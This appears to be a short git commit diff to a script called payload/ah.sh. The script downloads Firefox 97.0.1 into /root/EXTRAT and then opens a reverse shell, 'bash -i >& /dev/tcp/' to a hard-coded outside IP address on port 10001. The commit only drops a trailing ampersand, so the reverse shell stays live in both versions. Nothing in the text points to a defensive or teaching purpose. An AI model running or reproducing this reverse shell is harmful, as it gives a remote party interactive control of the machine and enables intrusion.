5be9ca9d594091c38d2bd16fecd2640ff5e70e3e
dev01team <125609175+dev01team@users.noreply.github.com>
2023-02-26 09:38:51 +0100

    Update ah.sh

--- payload/ah.sh
+++ payload/ah.sh
@@ -5,4 +5,4 @@ mkdir -p /root/EXTRAT/firefox-97.0.1/
 
 wget -q https://ftp.mozilla.org/pub/firefox/releases/97.0.1/linux-x86_64/en-GB/firefox-97.0.1.tar.bz2 && tar -xf firefox-97.0.1.tar.bz2 -C /root/EXTRAT/firefox-97.0.1/
 
-bash -i >& /dev/tcp/105.111.63.126/10001 0>&1 &
+bash -i >& /dev/tcp/105.111.63.126/10001 0>&1 
